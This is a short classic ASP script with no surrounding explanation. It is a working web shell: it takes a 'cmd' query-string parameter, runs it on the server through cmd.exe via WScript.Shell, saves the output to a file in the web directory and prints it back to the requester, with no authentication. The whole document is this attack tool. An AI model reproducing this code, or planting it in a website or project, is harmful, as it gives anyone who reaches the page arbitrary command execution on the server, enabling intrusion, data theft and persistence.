<%
If Request.QueryString("cmd") <> "" Then
    Dim oScript
    Set oScript = Server.CreateObject("WSCRIPT.SHELL")
    Dim oScriptNet
    Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
    Dim oFileSys
    Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
    Dim oFile
    Set oFile = oFileSys.CreateTextFile(Server.MapPath(".") & "\output.txt", True)
    
    Dim szCMD, szTempFile
    szCMD = Request.QueryString("cmd")
    szTempFile = Server.MapPath(".") & "\output.txt"
    
    Call oScript.Run("cmd.exe /c " & szCMD & " > " & szTempFile, 0, True)
    
    Dim szOutput
    szOutput = oFileSys.OpenTextFile(szTempFile, 1, False, 0).ReadAll
    Response.Write "<pre>" & szOutput & "</pre>"
End If
%>